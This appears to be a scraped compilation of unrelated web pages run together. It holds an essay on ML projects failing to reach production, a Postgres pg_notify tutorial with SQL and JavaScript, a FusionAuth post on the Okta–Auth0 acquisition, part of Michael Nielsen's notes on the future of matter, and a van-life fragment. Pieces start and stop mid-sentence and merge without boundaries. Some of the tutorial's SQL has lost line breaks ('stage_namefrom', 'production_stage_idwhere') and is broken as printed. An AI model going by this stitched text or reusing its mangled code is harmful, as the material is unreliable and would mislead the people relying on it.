<div><figure><img loading="lazy" src="https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/charles-deluvio-pjAH2Ax4uWk-unsplash-1-1024x683.jpg" alt="" width="768" height="512" srcset="https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/charles-deluvio-pjAH2Ax4uWk-unsplash-1-1024x683.jpg 1024w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/charles-deluvio-pjAH2Ax4uWk-unsplash-1-300x200.jpg 300w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/charles-deluvio-pjAH2Ax4uWk-unsplash-1-768x512.jpg 768w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/charles-deluvio-pjAH2Ax4uWk-unsplash-1-1536x1024.jpg 1536w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/charles-deluvio-pjAH2Ax4uWk-unsplash-1-2048x1365.jpg 2048w" sizes="(max-width: 768px) 100vw, 768px"><figcaption>When your business objectives and ML goals are misaligned, all of your best laid plans are bound to fail, just like that model you trained with stale data.

<p>The first challenge is strategic, not technical: starting with a solution instead of a clearly defined problem.&nbsp;</p>



<p>As companies race to incorporate ML into their organizations, leaders may hire data scientists and ML practitioners to automate or improve processes without a mature understanding of <a href="https://developers.google.com/machine-learning/problem-framing/good" target="_blank" rel="noopener"><strong>which problems are actually suitable for ML</strong></a> to solve. And even when the business problem is a good fit for ML, without a shared definition of what success looks like, projects can languish in experimentation mode for months while stakeholders wait for an idealized level of machine-like perfection that can never be reached.&nbsp;</p>



<p>Machine learning is not magic, it will not solve every problem perfectly, and should, by nature, continue to evolve over time. Sometimes, a model merely achieving the same results as humans is a worthy project—errors and all.&nbsp;</p>



<p>Before starting any project, ask your team or your stakeholders: <em>What business problem are we trying to solve? Why do we believe that ML is the right path? What is the measurable threshold of business value this project is trying to reach? What does “good enough” look like?&nbsp;</em></p>



<p>Without these clear, shared definitions articulated at the outset, many worthy ML projects will never reach production and valuable resources will be wasted. Solve a business problem using ML and not just embark on a ML project for checking off the ML box.</p>



<h3>Model training that doesn’t generalize</h3>



<p>With a clearly defined business problem and targeted success metrics, your potential pitfalls get more technical. During the model training stage, issues related to your training data or model fit are the likeliest culprit for future failure.&nbsp;</p>



<p>The goal of <a href="https://elitedatascience.com/model-training" target="_blank" rel="noopener"><strong>model training</strong></a> is to develop a model that can generalize, or make accurate predictions when given new data because it understands the relationships between data points and can identify trends. Your training dataset should be clean, sizable, and representative of the real-time data your model is expected to process once in production. No where has one seen clean data in a production environment. Expect to spend considerable time cleaning, labeling&nbsp; and feature engineering just to get the data ready.</p>



<p>Representative training data is also key: If your training data doesn’t reflect the actual datasets your model will encounter, you may end up with a model that won’t perform once you’ve reached testing or production.&nbsp;</p>



<p>Another issue that can occur during training is overfitting and underfitting. Overfitting happens when a model learns <em>too much </em>and produces outputs that fit too closely with your training data.</p>



<p>Underfitting is simply the opposite—your model doesn’t learn enough to make useful predictions on even the training data itself, let alone new data it will encounter in testing or production.</p>



<h3>Testing and validation issues</h3>



<p>As you test and validate your models, new challenges can arise from merging multiple data streams and making updates to improve performance. Changes to data sources, model parameters, and <a href="https://en.wikipedia.org/wiki/Feature_engineering" target="_blank" rel="noopener"><strong>feature engineering</strong></a> all introduce room for error.&nbsp;</p>



<p>This may also be the stage when you detect overfitting or underfitting in your model—a model that performed wonderfully during training but fails to produce useful results during testing may be overfit.&nbsp;</p>



<p>Even at companies like Google, where ML engineers abound, <a href="https://www.technologyreview.com/2020/04/27/1000658/google-medical-ai-accurate-lab-real-life-clinic-covid-diabetes-retina-disease/" target="_blank" rel="noopener">surprises</a> in your product models can—and will—arise.&nbsp;</p>



<h3>Deployment and serving hurdles</h3>



<p>Deploying ML projects is rarely simple, and teams typically can’t use consistent workflows to do so—since ML projects solve a wide range of business problems, there’s a similarly wide range of ways to host and deploy them. For example, some projects require batched predictions on a regular basis, while others need to generate and deliver predictions on-demand when an application makes an API request to predict using the model. (This is part of why it’s challenging to make models apply to different use cases, no matter how appealing it may sound to executives who may view ML models as more magic than narrowly focused functions.)</p>



<p>Additionally, some ML projects can require a lot of resources, and cross-functional teams need to agree upon priorities of deployment. Engineers only have so many things they can productionalize, and as we’ve discussed, ML projects are much more than models and algorithms: most will need infrastructure, alerting, maintenance, and more to be successfully deployed.&nbsp;</p>



<p>This is why it’s so important to articulate the business problem clearly at the outset, agree upon what success looks like, design an end-to-end solution, and have a shared understanding of your ML project’s value compared to other priorities. Without this strategic plan, your project may never receive the engineering resources it needs to finally reach production.&nbsp;</p>



<p>For just one example, Netflix never productionalized its <a href="https://www.wired.com/2012/04/netflix-prize-costs/" target="_blank" rel="noopener">million-dollar prize-winning recommendation algorithm</a> due to the winning model’s complexity to implement—instead choosing another submission that was simpler to integrate.&nbsp;&nbsp;</p>



<h3>Tactics for scalable ML in production</h3>

<p>Beyond strategic planning and staffing, there are concrete steps you can take to help scale your ML production.&nbsp;</p>



<h4>Lean into the cloud</h4>



<p>If your teams are working locally instead of in the cloud, it’s time to shift. Working in the cloud is the “glue” that keeps model training and deployment workflows in lockstep. Most vendors and open-source tools are developed for the cloud, and once there, it’s much easier to automate processes. Testing, training, validation and model deployment needs to be a repeatable process, it should not go from local Python code to a production environment.</p>



<h4>Leverage a DevOps approach</h4>



<p>Just as we’ve talked about applying DevOps practices to data, like <a href="https://www.montecarlodata.com/how-to-make-your-data-pipelines-more-reliable-with-slas/"><strong>setting data SLAs</strong></a> and measuring data health along <a href="https://www.montecarlodata.com/introducing-the-5-pillars-of-data-observability/">observability pillars</a>, ML teams can follow in DevOps’ footsteps by implementing the <strong><a href="https://www.infoworld.com/article/3271126/what-is-cicd-continuous-integration-and-continuous-delivery-explained.html" target="_blank" rel="noopener">Continuous Integration (CI) and Continuous Delivery (CD)</a> model</strong>, while introducing <a href="https://cloud.google.com/solutions/machine-learning/mlops-continuous-delivery-and-automation-pipelines-in-machine-learning" target="_blank" rel="noopener">Continuous Training (CT)</a>. By setting up agile build cycles and tools, ML teams can more rapidly deliver changes into the codebase and improve overall performance.&nbsp;</p>



<p>Similar to DevOps best practices, ML teams should use containerization to consistently run software across any type of device and make it simpler for engineers to productionalize their work. Keeping a consistent and visible build process that deploys smaller changes more frequently allows the team to work more smoothly and have more insight into what’s working well, and what’s not. Visibility also helps would-be code “gatekeepers” trust the build process and speed up the ML team’s workflow.&nbsp;</p>



<p>Investing time to build a strategic MLOps team and processes will help by reducing the likelihood of a project stalling out before production, and making continuous improvements feasible—setting every project up for long-term success.</p>



<h4>Invest in observability and monitoring&nbsp;</h4>



<p>Finally, the primary rule of machine learning is that your outcomes will only be as good as your inputs. Healthy data is absolutely essential to ML. Without clean data and working pipelines, models won’t be able to perform to their fullest potential and may fail to make accurate predictions.&nbsp;</p>



<p>And when you’re relying on ML to make important business decisions, you don’t want to find out about a broken pipeline or inaccurate data after those outputs have already been delivered.&nbsp;</p>



<p>That’s why <a href="https://www.montecarlodata.com/introducing-the-5-pillars-of-data-observability/"><strong>data observability</strong></a>, which provides a full understanding and comprehensive monitoring of data health—and can prevent bad data from reaching your ML models in the first place—is well worth the investment.&nbsp;</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              <p>We’re going to take a look how I used a Postgres feature, <code>pg_notify</code>, to power a work schedule for a manufacturing company. This particular product went through a dozen or so stages of manufacture, and each time a product advanced to its next stage the worker would record that progress from their workstation. The app we will build in this post displayed this schedule and allowed everyone to see the day’s progress.</p><h3 id="the-observer-pattern-in-sql">The Observer Pattern in SQL</h3><p>If you’re only used to using the standards of SQL in Postgres, the <code>NOTIFY</code> and <code>LISTEN</code> commands might not be familiar. But with these two commands you can implement something akin to the Observer pattern, but in your SQL engine!</p><p>The Observer pattern allows one class of object to “listen” for incoming events and another class to send events to those listeners. This pattern is commonly used for instances where data is being updated or changed, and several possibly unrelated objects need to react to those changes.</p><h3 id="observer-examples">Observer Examples</h3><p>Listening to state changes from a Redux store from inside of a React component is a common example of this pattern. Many React components listen to a single part of the Redux store. Android’s LiveData is another great example of this pattern, where observers can be created to watch for changes and immediately update the state and UI of an app.</p><h3 id="observing-in-postgresql">Observing in PostgreSQL</h3><figure><img src="https://blog.arctype.com/content/images/2021/03/Screen-Shot-2021-02-03-at-19.18.43.png" alt="" srcset="https://blog.arctype.com/content/images/size/w600/2021/03/Screen-Shot-2021-02-03-at-19.18.43.png 600w, https://blog.arctype.com/content/images/size/w1000/2021/03/Screen-Shot-2021-02-03-at-19.18.43.png 1000w, https://blog.arctype.com/content/images/2021/03/Screen-Shot-2021-02-03-at-19.18.43.png 1600w" sizes="(min-width: 720px) 720px"><figcaption>System architecture with pg_notify as the event bus.</figcaption></figure><p><code>NOTIFY</code> and <code>LISTEN</code> work together to allow you to implement this design within your Postgres database. Generally, <code>NOTIFY</code> will be called inside of a SQL query, oftentimes within a trigger. <a href="https://blog.arctype.com/learn-sql-triggers/">Triggers and event-based models go together well.</a> </p><!--kg-card-begin: html--><p>
    <h3>Looking for a collaborative SQL Editor?</h3>
    
</p><!--kg-card-end: html--><p><code>LISTEN</code> is called from your Postgres client. When an event is triggered by <code>NOTIFY</code> the client will be notified. The event contains a payload so the client can tell what event was triggered (this can also contain metadata or actual data from the database). How your client receives this notification and how you are able to process it from there varies from client to client. In our example, the client will use WebSockets to update each connected schedule client after it receives the signal from <code>pg_notify</code>.</p><h2 id="building-the-work-schedule-app">Building the Work Schedule App</h2><h3 id="schema-design">Schema Design</h3><p>Let’s begin on the Postgres side. We are modeling items that are being manufactured. Items in production will be represented by the <code>production_item</code> table. Each <code>production_item</code> has an associated <code>product_id</code> &nbsp;and a current stage of production. </p><figure><img src="https://blog.arctype.com/content/images/2021/03/Frame-27--1-.png" alt="" srcset="https://blog.arctype.com/content/images/size/w600/2021/03/Frame-27--1-.png 600w, https://blog.arctype.com/content/images/size/w1000/2021/03/Frame-27--1-.png 1000w, https://blog.arctype.com/content/images/2021/03/Frame-27--1-.png 1498w" sizes="(min-width: 720px) 720px"><figcaption>ERD Diagram made with <a href="https://blog.arctype.com/erd-builder/">Arctype's Free Figma template</a>.</figcaption></figure><p>We could store the current production stage as a column in the <code>production_item</code> table, but that would only allow us to see what stage the item is in currently. Instead, we’ll use a <code>production_item_wip</code> (work-in-progress) table where each row will contain a timestamp as the item progresses through the stages of production. Let’s also create a table that stores all the possible stages of production, <code>production_stage</code>. <code>production_stage</code> will have an <code>idx</code> integer column to store the order in which the stages occur. The query below creates the <code>production_item_wip</code> table, as an example.</p><pre><code>create table production_item_wip (  
  id serial primary key,  
  insert_time timestamp default NOW(),  
  production_item_id int references production_item(id),  
  production_stage_id int references production_stage(id),  
  employee_id int references employee(id)  
); </code></pre><p>PROTIP: You may notice I’ve included <code>insert_time</code> on every table. We will not need to use this column on every table for this particular example right now, but I’ve found that it often proves useful in the future. I spend a significant amount of time building queries and extracting useful statistics, and countless times I’ve been unable to use data because it lacked an <code>insert_time</code>. I would err on the side of adding it when designing database schema in general, if you’re unsure whether or not you should.</p><h3 id="postgres-notify-syntax">Postgres NOTIFY Syntax</h3><p>Using NOTIFY to send an event is dead simple! Here is a trigger procedure that sends a notification to the order_progress_event channel.</p><pre><code>create
or replace function fn_production_stage_modified() returns trigger as $psql$
begin
  perform pg_notify(
    'order_progress_event',
    'Time to refresh those screens!'
  );return new;
end;$psql$ language plpgsql;</code></pre><p><code>pg_notify</code> lends itself well to being used within a trigger when used to deliver real-time data streaming. However, you could just as easily call <code>pg_notify</code> from a regular SQL query: <code>select pg_notify('order_progress_event', 'Hello world!');</code></p><p>Inside of a PL/pgSQL procedure, you cannot <code>SELECT</code> a function, like <code>pg_notify</code>, that returns void. Doing so will cause a Postgres error. That’s why in the first example we use <code>perform</code>, while in the second we can simply use <code>select</code>.</p><p>With that procedure created, let’s add the actual trigger so that whenever an item moves along in the production process, and thus another row is inserted for <code>production_item_wip</code>, the procedure above is called.</p><pre><code>create trigger production_stage before
insert
  on production_item_wip for each row execute procedure fn_production_stage_modified();</code></pre><!--kg-card-begin: html--><p>
    <h3>The Collaborative SQL Editor</h3>
    
</p><!--kg-card-end: html--><p>That’s it! In this example the payload is the same each time. You could send actual data rather than just an alert, but in this example I prefer to send a basic notification so the client application can receive it and then in turn, select <em>exactly</em> what it needs in a separate query.</p><p>Encoding data within a notification, whether it’s a push notification or one from something like <code>pg_notify</code>, requires you to abstract away the source of the notification, assuming the data is normally delivered via an HTTP API. Using notifications as a “hint” for your software to reach out and get fresh data from an HTTP API simplifies the process and helps you reduce the number of different data sources you need to maintain.</p><h3 id="postgres-listen-syntax">Postgres LISTEN Syntax</h3><p>Listening to a channel is even simpler: <code>LISTEN order_progress_event;</code> </p><p>That really is all.</p><p>When this event is called, we’ll want to select the latest production data for the day. Here’s a view that will show how many products have progressed through each production stage today:</p><pre><code>create view view_daily_production_stats as
select
  count(1) as stage_count,
  ps.name as stage_namefrom production_item_wip piw
  join production_stage ps on ps.id = piw.production_stage_idwhere date(piw.insert_time) = date(now())
group by
  ps.id</code></pre><p>Now that your client is listening, how can you react to events it receives? This varies by client, since the featuresets of programming languages that serve async events vary heavily. We are using JavaScript’s <code>pg</code> client in this example. JavaScript is commonly used for asynchronous web programming.</p><pre><code>var clients = [];
function eventCallback(event) {
  query('select * from view_daily_production_stats', (data) =&gt; {
    clients.map(c =&gt; {
      c.send(data);
    });
  });
}
client.connect(function(err, client) {
  var query = client.query("LISTEN order_progress_event");
  client.on("notification", eventCallback);
});
;  </code></pre><p>Whenever a new event is received by the PostgreSQL client, the function <code>eventCallback</code> will be called with the payload from <code>NOTIFY</code>. The callback then queries the view we wrote earlier to select the most recent production stage data, and loops through to send the new data to all of the listening clients (Raspberry Pis). The clients receive the data and render HTML.</p><h3 id="putting-it-all-together">Putting it all Together</h3><figure><img src="https://blog.arctype.com/content/images/2021/03/IMG_0744.JPG" alt="" srcset="https://blog.arctype.com/content/images/size/w600/2021/03/IMG_0744.JPG 600w, https://blog.arctype.com/content/images/size/w1000/2021/03/IMG_0744.JPG 1000w, https://blog.arctype.com/content/images/2021/03/IMG_0744.JPG 1600w" sizes="(min-width: 720px) 720px"></figure><p><code>pg_notify</code> is simple, built-in to PostgreSQL feature that has tons of different potential use cases.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
              <p>Congrats to Auth0, their employees and investors on their acquisition by Okta! This validates that CIAM is a crucial part of any application and that outsourcing it to a provider like Auth0 just plain makes sense. The identity community owes a lot to Auth0, and that includes FusionAuth.</p>

<!--more-->

<p>We love the way that Auth0 spreads the word about the value of outsourcing your application’s auth systems. Today app developers can focus on building their apps. They can offload the effort of implementing and securing identity, authorization and authentication to companies like Auth0 or FusionAuth.</p>

<h2 id="auth-before-auth0">Auth before Auth0</h2>

<p>Before 2013, when Auth0 was founded, authentication was still the wild west. SAML was standardized in 2005, but was tremendously complex and beyond the abilities of the average developer to integrate. Plus, XML!</p>

<p>OAuth1 was a standard, but had some real flaws. Lack of support for native applications, cryptography requirements for clients and long lived access tokens, among other issues, meant that it never saw wide adoption.</p>

<p>OAuth2 was codified in 2012 and was in the process of being implemented by numerous vendors. Social sign on was a big thing, but there was an open question on whether it’d be federated using something like OpenID. This standard had momentum in the late 2000s, but was losing steam around this time.</p>

<p>The other alternative was having users’ online identity locked up in the vaults of Google, Facebook and others. The release of OIDC, the modern authentication framework, while in the works, was still in the future.</p>

<h2 id="simple-integrations-with-everything">Simple integrations with everything</h2>

<p>Auth0 started out by being the easiest way to integrate with your customer’s login systems. Their initial website slogan was: “Let your customers’ use their existing authentication infrastructure, with a simple, non-invasive JavaScript-based widget that works with most common enterprise authentication protocols.” And they continue to push the envelope on integration, with over 30 SSO integrations available right now.</p>

<p>In addition, their docs and support for open source has been great. Whether it is jwt.io (helping folks understand JSON Web Tokens), hundreds of example applications on GitHub or their excellent Identity Unlocked podcast, they’ve helped elevate developer’s understanding of authentication and authorization. Auth0’s documentation, educational content and expertise has helped every developer build more secure systems, and we thank them for that.</p>

<p>Like Auth0 FusionAuth has focused on a great developer experience, whether that means:</p>

<ul>
  <li>allowing developers to automate configuration and use our applications in ways we couldn’t imagine with our API first approach</li>
  <li>our extensive documentation that customers have said means they never need to talk to us, even when building out complex integrations, or</li>
  <li>our commitment to open sourcing vast swathes of our software systems, including our client libraries, supporting infrastructure or our documentation</li>
</ul>

<h2 id="solid-free-tier">Solid free tier</h2>

<p>With their SaaS model, Auth0 also provided a generous free tier. I’ve used this myself as a contractor for startups and I can tell you that it was superior to what I would have done if I’d rolled my own system. The free tier lets you offload concerns about authentication and focus on the application you want to build.</p>

<p>At FusionAuth we’ve always believed that authentication and authorization is necessary but not sufficient for every application. We’ve also seen way too many broken, insecure, frankly painful homegrown auth systems. Any startup application user that is in Auth0 or FusionAuth is one less user who has to worry about the security of their account.</p>

<p>In our book anything that lets startups focus on their core business is good for everyone, as it frees up more focus for innovation.</p>

<h2 id="what-does-the-okta-acquisition-mean-for-the-industry">What does the Okta acquisition mean for the industry?</h2>

<p>It’s hard to tell; we’re in for a few interesting months before the acquisition closes in July. It is unknown if there’ll be regulatory challenges.</p>

<p>But, we know one thing. You don’t buy another company to lose money. Okta is making a major commitment to CIAM and feels there’s lots of room for revenue growth. The long term strategic goals of Okta in acquiring Auth0, as stated in their investor documentation, are to gain access to a larger market, expand internationally and cross sell between the customer bases.</p>

<p><img src="https://fusionauth.io/assets/img/blogs/auth0-okta-acquisition/acquisition-reasons.png" alt="Okta explains to investors why they acquired Auth0."></p>

<p>While cross-selling will be great for Okta and primarily IT-centric customers, it may not be great for developers used to Auth0’s model. Developers and IT are brothers and sisters-in-arms, they have very different needs when it comes to integrations.</p>

<p>IT is justifiably conservative in accepting new features and vendors, while developers are focused on features and shipping. With luck, Auth0’s developer focus will not be subsumed by the needs of IT admins in the name of cross-selling.</p>

<p><img src="https://fusionauth.io/assets/img/blogs/auth0-okta-acquisition/tam-diagram.png" alt="CIAM and IAM markets in the view of Okta."></p>

<p>While Okta plans to run Auth0 as an independent unit, integration between two large companies with disparate cultures are not known for going smoothly. We hope that everyone meshes well and the new company runs smoothly, doesn’t raise prices, and continues to provide the great support and documentation that Auth0 is known for.</p>

<h2 id="how-does-this-relate-to-fusionauth">How does this relate to FusionAuth</h2>

<p>We applaud Auth0 on its accomplishments and congratulate Okta on its acquisition. While we admire what’s been done and continue to believe that CIAM will be important for applications and companies going forward, our strategy differs in two key areas.</p>

<p>First, we believe in the freedom to run your auth provider anywhere. Options provide flexibility to meet different application needs. If you want us to run your auth system, we’re happy to do so with <a href="https://fusionauth.io/pricing/cloud/">FusionAuth Cloud</a>. If you want to <a href="https://fusionauth.io/download/">download FusionAuth and run your auth system</a>, you can do so, whether in your cloud VPC, your data center, or even on your kiosk. Use our software to secure your user data, wherever you want to keep it.</p>

<p>Second, we believe no one should be priced out of world class authentication. While Auth0 has a solid free tier, as soon as you grow and need more features like SAML integrations, OIDC connections, or custom rules, prices increase, sometimes rapidly. In addition, the cliff in pricing when you reach the end of the free tier can be an unpleasant surprise depending on the number of users you have.</p>

<p>FusionAuth has <a href="https://account.fusionauth.io/price-calculator">transparent pricing with a calculator</a> anyone can use to see exactly what their monthly bill will be, as well as plans with unlimited users, SAML and OIDC connections. No need to hop on a sales call, unless you really want to.</p>

<p>We look forward to continuing to provide best in class auth systems for developers with <a href="https://fusionauth.io/docs/v1/tech/">great documentation</a>, <a href="https://fusionauth.io/docs/v1/tech/apis/">thoughtful APIs</a>, <a href="https://fusionauth.io/technical-support/">excellent support</a> and <a href="https://fusionauth.io/docs/v1/tech/5-minute-setup-guide/">quick and easy setup</a>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
    <p>
      <strong>Status:</strong> <em>Rough working notes – me
      thinking aloud. Speculative, and likely contains errors,
      misconceptions, and omissions; thoughtful, informed comments are
      welcome. Intended for a general scientifically curious audience,
      not requiring much detailed specialist background.</em>
    </p>
    
    <p>
      It is sometimes said physics is nearing its end – closing
      in on a “theory of everything” – because we
      understand so much about the basic rules governing the particles
      and forces in our universe. This is like asserting that computer
      science ended in 1936 with the Turing machine, computing's
      “theory of everything”. Of course, that's not what
      happened. Rather, the invention of the Turing machine opened a
      new creative frontier, enabling an extraordinary profusion of
      new ideas.
    </p>

    <p>
      Science is going through a similarly exciting transition
      today. Until recently humanity worked with matter much like we
      did computing prior to Turing, using a patchwork of bespoke
      tools and ideas. But now we understand the fundamentals of how
      matter works: we have a fantastic theory describing the
      elementary particles and forces, and we're getting increasingly
      good at manipulating matter. And so we're beginning to ask: what
      can we build, <em>in principle</em>? Not just in a practical
      sense, with the tools that happen to be at hand, but in a
      fundamental sense: what is allowed by the laws of physics?
    </p>

    <p>
      Of course, this implies a whole world of questions: What
      qualities are possible in matter? Can we do for matter what
      Turing and company did for computation? Can we invent new
      high-level abstractions and design principles for matter,
      similar to what people like John McCarthy and Alan Kay did for
      computing?  What design space is opened up when we control
      matter as well as we control pixels on a computer screen? What
      beautiful new design ideas are possible?
    </p>

    <p>
      Most of the matter in our everyday experience is constructed
      from just three particles: protons, electrons, and
      neutrons. These can be used to build an astonishing array of
      different things: diamonds; human beings; galaxies; black holes;
      iPhones. With sufficiently good tweezers and a lot of patience
      you could reassemble a human being into a bicycle of comparable
      mass; and vice versa.
    </p>

    <p>
      So, what else can we build from protons, electrons, and
      neutrons*<span>* Martin Rees has pointed out
      that we humans tend to engage in particle chauvinism, often
      assuming that what we think of as “ordinary matter”
      is all there is to matter. Indeed, I've engaged in just such a
      chauvinism in asserting above that “we understand the
      fundamentals of how matter works”.  However, based on what
      we currently suspect about dark matter, so-called
      “ordinary matter” may actually be rather unusual,
      the exception rather than the rule. Nonetheless, in the absence
      of a good understanding of dark matter I shall continue to
      engage in particle chauvinism, and restrict myself in this essay
      to ordinary matter. Indeed, I shall go further and restrict the
      discussion (mostly) to protons, electrons, and neutrons.
      </span>?
    </p>

    <p>
      It seems likely we can build things that would astonish us,
      things going radically beyond anything we can even conceive of
      today, much less build.
    </p>

    <p>
      Consider that ten million years ago conscious minds were absent
      from the earth, except in quite primitive forms. Might there be
      forms of matter possible which are as different from anything
      familiar to us today as consciousness is from a
      rock*<span>* Some people don't believe
      consciousness is a property of matter. There are limited senses
      in which that is reasonable: certainly, matter is a substrate,
      and aspects of consciousness may be independent of the details
      of that substrate, in a matter analogous to the way an algorithm
      has an existence independent of the computer it runs
      on. Nonetheless, I don't think there is much serious reason to
      doubt that consciousness is a property that emerges out of
      ordinary matter.</span>?
    </p>
    
    <p>
      What might those forms be?
    </p>

    <p>
      One way to explore the “what can we build?” question
      is to look at different <em>maps of matter</em>. Probably the
      best known such map is the periodic table, showing all the
      different types of atoms which make up most of the matter in the
      world around us. But there's many other maps of matter. There's
      phylogenetic trees, which show the relationship between
      different types of life. There's maps of the different types of
      stars, of the different phases of matter, of all the proteins
      we've found. And many more.
    </p>

    <p>
      In these notes we'll go on safari through several such maps of
      matter. We won't go too deep into any individual map –
      everything I discuss could be (often has been) the subject of
      PhD theses, or even an entire field. Instead, we're going to
      look rapidly at several different ways we explore matter. The
      purpose is to discern some general principles that can help us
      explore in generative ways.
    </p>

    <p>
      When I began writing these notes I had a whimsical question in
      mind: is there a single, unified map we can use to understand
      all of matter? I hoped the attempt to make such a unified map
      would give me some insight into the question “what can we
      build, in principle?” And so, as I wrote the notes I toyed
      with multiple ways of making a unified map. Eventually, I
      realized matter is too rich and variegated for a really good
      unified map to be possible. What's more, to do even a passing
      job these notes would need to be a hundred times longer!
      Nonetheless, I found the attempt stimulating. And so at the end
      of the notes I show a single diagram which encapsulates many of
      the ideas for exploration developed in these notes. It's grossly
      incomplete, but hopefully interesting and generative.
    </p>

    <h2>The strangest places in the periodic table</h2>

    <p>
      The physicist John Wheeler once stated a useful principle to
      guide research: “In any field, find the strangest thing
      and explore it”. One great thing about maps is that they
      suggest strange things. This is true even when the map itself is
      familiar, like the periodic table. We can ask ourselves: where
      are the strangest “places” in the periodic table?
      And then challenge ourselves to explore those places.
    </p>

    <p>
      One candidate for the strangest place in the periodic table is
      the most recently discovered chemical element, oganesson. It's
      the heaviest known element, with an atomic number of 118. It's
      highlighted below with a red circle in the bottom
      right*<span>* Image adapted from images due
      to users “Double sharp” and “Offnfopt”
      on <a href="https://commons.wikimedia.org/wiki/File:Simple_Periodic_Table_Chart-blocks.svg">Wikipedia</a>.</span>:
    </p>

    <center>
    <img src="https://futureofmatter.com/assets/periodic_table.svg" width="100%">
    </center>
    
    <p>
      Oganesson was discovered in 2002 by a team of scientists headed
      by Yuri Oganessian, after being predicted in 1895 by Hans Peter
      Jørgen Julius Thomsen. It was made by using calcium ions to
      bombard a target of californium atoms, at very high speed. Only
      a handful of oganesson atoms have ever been observed –
      around a half dozen, with several of those observations regarded
      as unconfirmed.
    </p>

    <p>
      We don't know much for sure about oganesson – the handful
      of atoms observed decayed too quickly to get much idea of what
      oganesson does. Despite this, intensive theoretical studies have
      been done, and some surprising predictions made. Oganesson is in
      the final column of the periodic table, and these are of course
      the “noble gases”, highly non-reactive gases like
      helium and argon.
    </p>

    <p>
      At least, that's the story we learn in high school chemistry. In
      fact, oganesson confounds these expectations. Theoretical
      calculations suggest oganesson is likely to be a solid
      semiconductor at standard temperature and pressure, not a
      gas. Furthermore, it may be significantly reactive, unlike the
      other noble gases*<span>* Clinton
      S. Nash, <a href="https://pubs.acs.org/doi/10.1021/jp050736o">Atomic
      and Molecular Properties of Elements 112, 114, and 118</a>
      (2005). Note that the other noble gases <em>are</em> at least
      somewhat reactive (disodium helide, anyone?)
      – <a href="https://en.wikipedia.org/wiki/Noble_gas_compound">Wikipedia's
      discussion is a good place to start</a> – but oganesson is
      predicted to be significantly moreso.</span>.
    </p>

    <p>
      There is a standard argument for why noble gases are
      non-reactive gases – the gist is to understand the
      electron orbital shell structure, the number of electrons in
      each, and why full shells are particularly stable and lead to
      non-reactive elements. What you learn from oganesson is that
      some of the principles underlying that argument can't be quite
      right. I must admit, I haven't worked through the details of how
      the standard argument breaks down (beyond quickly skimming the
      above paper); nonetheless, it's extremely useful to have a
      little flag in my head saying that the standard argument about
      electron orbitals and noble gases actually breaks down for some
      elements.  That argument is often presented as being based on
      universal principles, but those principles are not, in fact,
      universal.
    </p>

    
    <p>
      And so one benefit of exploring oganesson is that it improves
      other parts of your understanding of matter, even if only by
      informing you of limits to that understanding. And it pokes at
      you: the periodic table has the shape it does <em>because</em>
      of those underlying principles. If …</p></div></div>

Australia is littered with wonderful places like these that cost absolutely nothing to work from and the amount of time you can stay varies from 7 days, 14 days to unlimited duration.</p><figure><div><div><p><img src="https://ghuntley.com/content/images/2021/03/2021-02-12_7-00-57.jpg" width="1600" height="702" alt="" srcset="https://ghuntley.com/content/images/size/w600/2021/03/2021-02-12_7-00-57.jpg 600w, https://ghuntley.com/content/images/size/w1000/2021/03/2021-02-12_7-00-57.jpg 1000w, https://ghuntley.com/content/images/2021/03/2021-02-12_7-00-57.jpg 1600w" sizes="(min-width: 720px) 720px"></p><p><img src="https://ghuntley.com/content/images/2021/03/2021-02-12_7-03-15.jpg" width="1600" height="690" alt="" srcset="https://ghuntley.com/content/images/size/w600/2021/03/2021-02-12_7-03-15.jpg 600w, https://ghuntley.com/content/images/size/w1000/2021/03/2021-02-12_7-03-15.jpg 1000w, https://ghuntley.com/content/images/2021/03/2021-02-12_7-03-15.jpg 1600w" sizes="(min-width: 720px) 720px"></p></div><div><p><img src="https://ghuntley.com/content/images/2021/03/Photo_6554005_DJI_405_jpg_6288768_0_202121019728_photo_original-PANO.jpg" width="1600" height="805" alt="" srcset="https://ghuntley.com/content/images/size/w600/2021/03/Photo_6554005_DJI_405_jpg_6288768_0_202121019728_photo_original-PANO.jpg 600w, https://ghuntley.com/content/images/size/w1000/2021/03/Photo_6554005_DJI_405_jpg_6288768_0_202121019728_photo_original-PANO.jpg 1000w, https://ghuntley.com/content/images/2021/03/Photo_6554005_DJI_405_jpg_6288768_0_202121019728_photo_original-PANO.jpg 1600w" sizes="(min-width: 720px) 720px"></p><p><img src="https://ghuntley.com/content/images/2021/03/Photo_6554041_DJI_441_jpg_5021097_0_202121272854_photo_original.jpg" width="1600" height="1200" alt="" srcset="https://ghuntley.com/content/images/size/w600/2021/03/Photo_6554041_DJI_441_jpg_5021097_0_202121272854_photo_original.jpg 600w, https://ghuntley.com/content/images/size/w1000/2021/03/Photo_6554041_DJI_441_jpg_5021097_0_202121272854_photo_original.jpg 1000w, https://ghuntley.com/content/images/2021/03/Photo_6554041_DJI_441_jpg_5021097_0_202121272854_photo_original.jpg 1600w" sizes="(min-width: 720px) 720px"></p></div></div></figure><p>The absolute best place I've stayed at recently by far has been Narrabeen in Sydney, Australia at a van park.

March 4, 2021 | https://oxide.computer/blog/compensation-as-a-reflection-of-values/ | <a href="https://web.archive.org/web/*/https://oxide.computer/blog/compensation-as-a-reflection-of-values/">archive.org</a>
